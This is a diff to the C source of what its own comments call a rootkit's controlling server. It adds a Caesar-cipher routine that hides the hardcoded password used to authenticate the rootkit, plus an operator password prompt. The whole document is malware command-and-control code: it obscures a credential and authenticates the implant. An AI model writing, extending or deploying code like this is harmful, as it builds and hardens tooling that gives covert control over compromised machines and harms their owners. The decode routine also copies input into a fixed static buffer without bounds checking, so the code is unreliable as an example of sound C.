@@ -10,6 +10,39 @@
 #include "server.h"
 #include "commands.h"
 
+static char *decrypt_caesar(const char *encrypted)
+{
+    static char decrypted[256];
+    int i;
+
+    for (i = 0; encrypted[i]; i++) {
+        char c = encrypted[i];
+        if (c >= 'a' && c <= 'z')
+            decrypted[i] = 'a' + (c - 'a' - 3 + 26) % 26;
+        else if (c >= 'A' && c <= 'Z')
+            decrypted[i] = 'A' + (c - 'A' - 3 + 26) % 26;
+        else if (c >= '0' && c <= '9')
+            decrypted[i] = '0' + (c - '0' - 3 + 10) % 10;
+        else
+            decrypted[i] = c;
+    }
+    decrypted[i] = '\0';
+    return decrypted;
+}
+
+int check_password(void)
+{
+    char input[256];
+
+    printf("Password: ");
+    fflush(stdout);
+    if (!fgets(input, sizeof(input), stdin))
+        return 0;
+    input[strcspn(input, "\n")] = '\0';
+    return strcmp(input, decrypt_caesar(WLKOM_PASSWORD)) == 0;
+}
+
+
 /* ─── XOR (mirror of rootkit) ─── */
 
 static void xor_crypt(char *data, size_t len)
@@ -139,9 +172,10 @@ static void handle_client(client_t *c)
     c->authed    = false;
 
     /* Authenticate the rootkit */
+    const char *real_pass = decrypt_caesar(WLKOM_PASSWORD);
     if (send_packet(c->fd, CMD_AUTH,
-                    WLKOM_PASSWORD,
-                    strlen(WLKOM_PASSWORD)) < 0) {
+                    real_pass,
+                    strlen(real_pass)) < 0) {
         log_event("❌ Failed to send auth\n");
         goto disconnect;
     }
